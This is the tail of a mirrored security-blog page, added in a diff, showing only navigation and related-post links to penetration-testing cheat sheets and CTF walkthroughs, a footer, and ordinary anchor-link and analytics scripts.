+<p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
+<p><br></p>
+</div>
+</div>
+<h2><br>Also... <br> <br>You might want to read these</h2>
+</div>
+</div>
+</section>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Post Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../penetration-testing-tools-cheat-sheet/index.html">Penetration Testing Tools Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>kali linux</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../sleepy-ctf-walkthrough/index.html">/dev/random: Sleepy Walkthrough CTF</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../pipe-ctf-walkthrough/index.html">/dev/random Pipe walkthrough</a></b></p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles">
+<aside>
+<ul>
+<li class="">
+<a href="../index.html">All Blog</a>
+</li>
+<li class="">
+<a href="../cheat-sheet/index.html">Cheat Sheets</a>
+</li>
+<li class="">
+<a href="../techniques/index.html">Techniques</a>
+</li>
+<li class="">
+<a href="../security-hardening/index.html">Security Hardening</a>
+</li>
+<li class="">
+<a href="../walkthroughs/index.html">WalkThroughs</a>
+</li>
+</ul>
+<h4>Cheat Sheets</h4>
+<ul>
+<li class="">
+<a href="../penetration-testing-tools-cheat-sheet/index.html">Penetration Testing Tools Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../vi-cheat-sheet/index.html">Vi Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../systemd-cheat-sheet/index.html">Systemd Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nbtscan-cheat-sheet/index.html">nbtscan Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-commands-cheat-sheet/index.html">Linux Commands Cheat Sheet</a>
+</li>
+<li>
+<a href="../cheat-sheet/index.html">More »</a>
+</li>
+</ul>
+<h4>WalkThroughs</h4>
+<ul>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
+</li>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
+</li>
+<li class="">
+<a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a>
+</li>
+<li class="">
+<a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a>
+</li>
+<li class="">
+<a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a>
+</li>
+<li>
+<a href="../walkthroughs/index.html">More »</a>
+</li>
+</ul>
+<h4>Techniques</h4>
+<ul>
+<li class="">
+<a href="../ssh-meterpreter-pivoting-techniques/index.html">SSH & Meterpreter Pivoting Techniques</a>
+</li>
+<li>
+<a href="../techniques/index.html">More »</a>
+</li>
+</ul>
+<h4>Security Hardening</h4>
+<ul>
+<li class="">
+<a href="../security-harden-centos-7/index.html">Security Harden CentOS 7</a>
+</li>
+<li>
+<a href="../security-hardening/index.html">More »</a>
+</li>
+</ul>
+<h4>/dev/urandom</h4>
+<ul>
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li>
+<a href="../urandom/index.html">More »</a>
+</li>
+</ul>
+<h4>Other Blog</h4>
+<ul>
+<li class="">
+<a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
+</li>
+<li class="">
+<a href="../jenkins-api-unauthenticated-rce-exploit/index.html">Jenkins RCE via Unauthenticated API</a>
+</li>
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li class="">
+<a href="../enum4linux-cheat-sheet/index.html">enum4linux Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-local-enumeration-script/index.html">Linux Local Enumeration Script</a>
+</li>
+
+<li class="">
+<a href="../howto-install-quassel-ubuntu/index.html">HowTo Install Quassel on Ubuntu</a>
+</li>
+<li class="">
+<a href="../keepnote-macbook-install-instructions/index.html">HowTo Install KeepNote on OSX Mavericks</a>
+</li>
+</ul>
+</aside>
+</div>
+<div class="clear"></div>
+</div>
+</section>
+<footer>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<p>The contents of this website are &copy;&nbsp;2017 <a href="http://highon.coffee/">HighOn.Coffee</a></p>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>
+Proudly hosted by
+<img src="https://highon.coffee/img/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script data-cfasync="false" src="https://highon.coffee/cdn-cgi/scripts/ddc5a536/cloudflare-static/email-decode.min.js"></script><script>
+  var anchorForId = function (id) {
+    var anchor = document.createElement("a");
+    anchor.className = "header-link";
+    anchor.href      = "#" + id;
+    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
+    return anchor;
+  };
+
+  var linkifyAnchors = function (level, containingElement) {
+    var headers = containingElement.getElementsByTagName("h" + level);
+    for (var h = 0; h < headers.length; h++) {
+      var header = headers[h];
+
+      if (typeof header.id !== "undefined" && header.id !== "") {
+        header.appendChild(anchorForId(header.id));
+      }
+    }
+  };
+
+  document.onreadystatechange = function () {
+    if (this.readyState === "complete") {
+      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
+      if (!contentBlock) {
+        return;
+      }
+      for (var level = 1; level <= 6; level++) {
+        linkifyAnchors(level, contentBlock);
+      }
+    }
+  };
+</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-55017594-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+</body>
+
+<!-- Mirrored from highon.coffee/blog/tr0ll-2-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 18:05:00 GMT -->
+</html>
